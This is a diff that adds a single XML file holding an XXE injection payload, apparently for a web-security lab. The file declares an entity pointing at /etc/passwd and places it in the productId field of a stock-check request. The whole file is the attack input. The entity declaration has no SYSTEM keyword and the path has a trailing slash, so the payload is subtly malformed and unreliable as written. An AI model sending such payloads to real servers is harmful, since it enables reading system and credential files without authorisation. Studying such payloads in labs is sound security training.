@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [<!ENTITY bar "file:///etc/passwd/">]>
+	<stockCheck>
+		<productId>
+			&bar;
+		</productId>
+		<storeId>
+			2
+		</storeId>
+	</stockCheck>
